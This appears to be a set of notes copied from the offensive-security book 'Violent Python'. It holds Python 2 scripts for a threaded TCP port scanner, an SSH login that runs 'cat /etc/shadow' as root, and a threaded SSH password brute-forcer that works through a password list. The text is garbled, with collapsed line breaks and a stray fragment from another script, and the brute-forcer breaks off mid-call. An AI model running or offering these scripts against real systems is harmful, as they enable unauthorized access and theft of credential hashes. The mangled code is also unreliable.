"""socket.gethostbyname(hostname) – This function takes a hostname such as www.syngress.com and returns an IPv4 address format such as 69.163.177.2.socket.gethostbyaddr(ip address) – This function takes an IPv4 address and returns a triple containing the hostname, alternative list of host names, and a list of IPv4/v6 addresses for the same interface on the host.socket.socket([family[, type[, proto]]]) – This function creates an instance of a new socket given the family. Options for the socket family are AF_INET, AF_INET6, or AF_UNIX. Additionally, the socket can be specified as SOCK_STREAM for a TCP socket or SOCK_DGRAM for a UDP socket. Finally, the protocol number is usually zero and is omitted in most cases.socket.create_connection(address[, timeout[, source_address]]) – This function takes a 2-tuple (host, port) and returns an instance of a network socket. Additionally,  it has the option of taking a timeout and source address.  """  """  import optparsefrom socket import *from threading import * screenLock = Semaphore(value=1) def connScan(tgtHost, tgtPort):try:connSkt = socket(AF_INET, SOCK_STREAM) connSkt.connect((tgtHost, tgtPort)) connSkt.send('ViolentPython\r\n') results = connSkt.recv(100) screenLock.acquire()print '[+]%d/tcp open'% tgtPortprint '[+] ' + str(results)except:screenLock.acquire()print '[-]%d/tcp closed'% tgtPortfinally: screenLock.release() connSkt.close()def portScan(tgtHost, tgtPorts): try:tgtIP = gethostbyname(tgtHost) except:print "[-] Cannot resolve '%s': Unknown host"%tgtHostreturn try:tgtName = gethostbyaddr(tgtIP)print '\n[+] Scan Results for: ' + tgtName[0] except:print '\n[+] Scan Results for: ' + tgtIP setdefaulttimeout(1)for tgtPort in tgtPorts:t = Thread(target=connScan, args=(tgtHost, int(tgtPort)))t.start()def main():parser = optparse.OptionParser('usage%prog '+\'-H <target host> -p <target port>') parser.add_option('-H', dest='tgtHost', type='string', \help='specify target host')parser.add_option('-p', dest='tgtPort', type='string', \help='specify target port[s] separated by comma') (options, args) = parser.parse_args()tgtHost = options.tgtHosttgtPorts = str(options.tgtPort).split(', ')if (tgtHost == None) | (tgtPorts[0] == None): print parser.usageexit(0)portScan(tgtHost, tgtPorts) if __name__ == "__main__":main()if (tgtHost == None) | (tgtPorts[0] == None): print parser.usageexit(0)for tgtPort in tgtPorts: nmapScan(tgtHost, tgtPort)if __name__ == '__main__': main()import pexpectPROMPT = ['# ', '>>> ', '> ', '\$ '] def send_command(child, cmd):child.sendline(cmd) child.expect(PROMPT) print child.beforedef connect(user, host, password):ssh_newkey = 'Are you sure you want to continue connecting' connStr = 'ssh ' + user + '@' + hostchild = pexpect.spawn(connStr)ret = child.expect([pexpect.TIMEOUT, ssh_newkey, \'[P|p]assword:']) if ret == 0:print '[-] Error Connecting'returnif ret == 1:child.sendline('yes')ret = child.expect([pexpect.TIMEOUT, \'[P|p]assword:']) if ret == 0:print '[-] Error Connecting'return child.sendline(password) child.expect(PROMPT) return childdef main():host = 'localhost'user = 'root'password = 'toor'child = connect(user, host, password) send_command(child, 'cat /etc/shadow | grep root')if __name__ == '__main__': main()import pxsshimport optparseimport timefrom threading import *maxConnections = 5connection_lock = BoundedSemaphore(value=maxConnections) Found = FalseFails = 0def connect(host, user, password, release):global Found global Fails try:s = pxssh.pxssh()s.login(host, user, password)print '[+] Password Found: ’ + passwordFound = Trueexcept Exception, e:if 'read_nonblocking' in str(e): Fails += 1time.sleep(5)connect(host, user, password, False)elif 'synchronize with original prompt' in str(e):time.sleep(1)connect(host, user, password, False) finally:if release: connection_lock.release() def main():parser = optparse.OptionParser('usage%prog '+\'-H <target host> -u <user> -F <password list>')parser.add_option('-H', dest='tgtHost', type='string', \ help='specify target host')parser.add_option('-F', dest='passwdFile', type='string', \ help='specify password file')parser.add_option('-u', dest='user', type='string', \ help='specify the user')(options, args) = parser.parse_args() host = options.tgtHostpasswdFile = options.passwdFileuser = options.userif host == None or passwdFile == None or user == None: print parser.usageexit(0)fn = open(passwdFile, 'r') for line in fn.readlines(): if Found:print "[*] Exiting: Password Found"exit(0)if Fails > 5:print "[!] Exiting: Too Many Socket Timeouts" exit(0)connection_lock.acquire()password = line.strip('\r').strip('\n')print "[-] Testing: "+str(password)t = Thread(target=connect, args=(host, user,                                 Finnished at exploitint ssh through weak private keys                                 """